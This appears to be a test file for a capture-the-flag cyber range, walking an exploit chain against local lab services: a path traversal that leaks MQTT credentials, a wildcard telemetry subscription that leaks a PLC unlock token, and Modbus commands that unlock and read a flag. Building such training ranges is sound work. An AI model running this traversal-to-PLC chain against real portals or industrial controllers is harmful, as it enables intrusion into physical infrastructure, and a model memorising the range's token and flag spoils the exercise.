"""Cold Chain estate test — portal traversal -> MQTT subscribe -> Modbus unlock -> crown.

Starts the three stdlib services (portal, MQTT broker, Modbus PLC) on ephemeral
localhost ports, then walks the protocol-bridging chain end-to-end and asserts
every step, plus the negative cases that make each hop real:

- the portal's ``GET /invoice?file=`` traversal leaks ``.mqtt_credentials`` and
  ``warehouse-topology.json``;
- the MQTT broker rejects wrong CONNECT credentials (CONNACK 0x04);
- subscribing to ``depot/+/telemetry`` leaks the automation token and PLC address;
- READ_HOLDING returns the freezer setpoint;
- UNLOCK_CAL denies a wrong token and the crown stays locked (Modbus exception);
- READ_CROWN returns ``KEYSTONE{coldchain-crown-<rot>}`` only after unlock.

Pure stdlib; no podman/libvirt/qemu required.
"""
from __future__ import annotations

import importlib.util
import json
import socket
import struct
import sys
import tempfile
import unittest
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]  # range/
sys.path.insert(0, str(ROOT))

_SERVICES_PATH = ROOT / "estates" / "cold-chain" / "services.py"
_spec = importlib.util.spec_from_file_location("coldchain_services", _SERVICES_PATH)
services = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(services)


# --- minimal MQTT 3.1.1 client (CONNECT / SUBSCRIBE / read PUBLISH) -----------

def _rem_len(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def _rem_len_decode(fh) -> int:
    multiplier = 1
    value = 0
    for _ in range(4):
        byte = fh.read(1)
        if not byte:
            raise EOFError
        b = byte[0]
        value += (b & 0x7F) * multiplier
        if not (b & 0x80):
            return value
        multiplier *= 128
    raise ValueError("malformed remaining length")


def _pack_str(text: str) -> bytes:
    data = text.encode("utf-8")
    return struct.pack(">H", len(data)) + data


def _read_exact(fh, n: int) -> bytes:
    data = fh.read(n)
    if len(data) != n:
        raise EOFError
    return data


def mqtt_connect(host, port, client_id, username, password):
    """Send CONNECT and return (sock, fh, connack_return_code)."""
    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(10)
    var_header = b"\x00\x04MQTT\x04" + b"\xc2" + b"\x00\x3c"  # user+pass+clean, keepalive 60
    payload = _pack_str(client_id) + _pack_str(username) + _pack_str(password)
    body = var_header + payload
    sock.sendall(b"\x10" + _rem_len(len(body)) + body)
    fh = sock.makefile("rb")
    first = fh.read(1)
    if first != b"\x20":
        sock.close()
        return None, None, -1
    rl = _rem_len_decode(fh)
    ack = _read_exact(fh, rl)
    rc = ack[1] if len(ack) >= 2 else -1
    if rc != 0x00:
        sock.close()
        return None, None, rc
    return sock, fh, rc


def mqtt_subscribe_collect(sock, fh, topic_filter: str, timeout: float = 2.0):
    """SUBSCRIBE and return every PUBLISH frame the broker pushes back."""
    body = b"\x00\x01" + _pack_str(topic_filter) + b"\x00"
    sock.sendall(b"\x82" + _rem_len(len(body)) + body)
    sock.settimeout(timeout)
    first = fh.read(1)
    if first != b"\x90":
        raise AssertionError(f"expected SUBACK, got {first!r}")
    rl = _rem_len_decode(fh)
    _read_exact(fh, rl)
    messages = []
    while True:
        try:
            first = fh.read(1)
        except socket.timeout:
            break
        if not first:
            break
        ptype = first[0] >> 4
        rl = _rem_len_decode(fh)
        frame = _read_exact(fh, rl)
        if ptype == 3:  # PUBLISH
            tlen = (frame[0] << 8) | frame[1]
            topic = frame[2:2 + tlen].decode("utf-8", "replace")
            messages.append((topic, frame[2 + tlen:]))
    return messages


# --- minimal Modbus-TCP client ------------------------------------------------

def modbus_request(host, port, unit_id, pdu, timeout: float = 10.0) -> bytes:
    """Send one Modbus request (MBAP header + PDU) and return the response PDU."""
    txn = 0x0001
    header = struct.pack(">HHHB", txn, 0, len(pdu) + 1, unit_id)
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(header + pdu)
        fh = sock.makefile("rb")
        resp_header = _read_exact(fh, 7)
        _rtxn, _rproto, rlength, _runit = struct.unpack(">HHHB", resp_header)
        return _read_exact(fh, rlength - 1)


class ColdChainEstateTest(unittest.TestCase):
    UNLOCK_TOKEN = "CAL-AUTO-7f3a91bd"
    CROWN_FLAG = "KEYSTONE{coldchain-crown-7f3a91}"

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.estate = services.build_estate(
            Path(cls._tmp.name), cls.UNLOCK_TOKEN, cls.CROWN_FLAG)
        for svc in cls.estate.values():
            svc.start()

    @classmethod
    def tearDownClass(cls):
        for svc in cls.estate.values():
            svc.stop()
        cls._tmp.cleanup()

    def _portal_get(self, file_param: str) -> bytes:
        url = (f"http://127.0.0.1:{self.estate['portal'].port}"
               f"/invoice?file={file_param}")
        return urllib.request.urlopen(url, timeout=10).read()

    def _leak_credentials(self):
        raw = self._portal_get("../.mqtt_credentials")
        creds = json.loads(raw.decode())["broker"]
        return creds["host"], creds["port"], creds["username"], creds["password"]

    def _leak_telemetry(self):
        host, port, user, pw = self._leak_credentials()
        sock, fh, rc = mqtt_connect(host, port, "coldchain-test", user, pw)
        self.assertEqual(rc, 0x00, "MQTT CONNECT with leaked creds must be accepted")
        messages = mqtt_subscribe_collect(sock, fh, "depot/+/telemetry")
        sock.close()
        return messages

    def test_01_portal_traversal_leaks_files(self):
        legit = self._portal_get("invoice_2026-001.txt").decode()
        self.assertIn("invoice 2026-001", legit)
        # traversal escapes invoices/ into the app root
        creds = json.loads(self._portal_get("../.mqtt_credentials").decode())
        self.assertEqual(creds["broker"]["host"], "127.0.0.1")
        self.assertEqual(creds["broker"]["port"], self.estate["broker"].port)
        self.assertEqual(creds["broker"]["username"], services.MQTT_USER)
        self.assertEqual(creds["broker"]["password"], services.MQTT_PASS)
        topo = json.loads(self._portal_get("../warehouse-topology.json").decode())
        self.assertEqual(topo["estate"], "cold-chain")
        self.assertEqual(topo["telemetry"]["mqtt_topic"], "depot/+/telemetry")
        self.assertEqual(topo["control"]["plc"]["modbus_unit_id"], 1)

    def test_02_mqtt_rejects_wrong_credentials(self):
        sock, _fh, rc = mqtt_connect(
            "127.0.0.1", self.estate["broker"].port,
            "coldchain-test", services.MQTT_USER, services.MQTT_PASS + "-wrong")
        self.assertEqual(rc, 0x04, "bad credentials must get CONNACK 0x04")
        self.assertIsNone(sock)

    def test_03_mqtt_subscribe_leaks_token_and_plc(self):
        messages = self._leak_telemetry()
        self.assertGreaterEqual(len(messages), 1)
        token = plc = None
        for _topic, payload in messages:
            obj = json.loads(payload.decode())
            cal = obj.get("calibration")
            if cal and "automation_token" in cal and "plc" in cal:
                token, plc = cal["automation_token"], cal["plc"]
        self.assertIsNotNone(token, "telemetry must leak the automation token")
        self.assertIsNotNone(plc, "telemetry must leak the PLC address")
        self.assertEqual(token, self.UNLOCK_TOKEN)
        plc_host, plc_port = plc.rsplit(":", 1)
        self.assertEqual(plc_host, "127.0.0.1")
        self.assertEqual(int(plc_port), self.estate["plc"].port)

    def test_04_modbus_read_holding_returns_setpoint(self):
        plc = self.estate["plc"]
        pdu = modbus_request("127.0.0.1", plc.port, plc.unit_id,
                             struct.pack(">BHH", services.PlcService.FN_READ_HOLDING, 0, 2))
        self.assertEqual(pdu[0], 0x03)
        self.assertEqual(pdu[1], 4)  # byte count = 2 registers
        regs = struct.unpack(">HH", pdu[2:6])
        raw_setpoint = regs[0]
        if raw_setpoint >= 0x8000:  # sign-extend two's-complement tenths of a degree
            raw_setpoint -= 0x10000
        self.assertEqual(raw_setpoint, int(round(plc.setpoint_c * 10)))
        self.assertEqual(plc.setpoint_c, services.SETPOINT_C)
        self.assertEqual(regs[1], 1 if plc.unlocked else 0)  # calibration status

    def test_05_modbus_unlock_requires_token(self):
        plc = self.estate["plc"]
        self.assertFalse(plc.unlocked)
        # wrong token is denied
        pdu = modbus_request("127.0.0.1", plc.port, plc.unit_id,
                             b"\x41" + b"WRONG-TOKEN")
        self.assertEqual(pdu, b"\x41\x00")
        self.assertFalse(plc.unlocked)
        # crown is still locked (Modbus exception, no flag)
        pdu = modbus_request("127.0.0.1", plc.port, plc.unit_id, b"\x42")
        self.assertEqual(pdu[0], 0xC2)
        self.assertNotIn(self.CROWN_FLAG.encode(), pdu)
        # correct leaked token unlocks calibration
        pdu = modbus_request("127.0.0.1", plc.port, plc.unit_id,
                             b"\x41" + self.UNLOCK_TOKEN.encode())
        self.assertEqual(pdu, b"\x41\x01")
        self.assertTrue(plc.unlocked)

    def test_06_modbus_read_crown_returns_flag(self):
        plc = self.estate["plc"]
        if not plc.unlocked:
            modbus_request("127.0.0.1", plc.port, plc.unit_id,
                           b"\x41" + self.UNLOCK_TOKEN.encode())
        pdu = modbus_request("127.0.0.1", plc.port, plc.unit_id, b"\x42")
        self.assertEqual(pdu[0], 0x42)
        flag = pdu[1:].decode()
        self.assertEqual(flag, self.CROWN_FLAG)
        self.assertRegex(flag, r"^KEYSTONE\{coldchain-crown-")


if __name__ == "__main__":
    unittest.main()
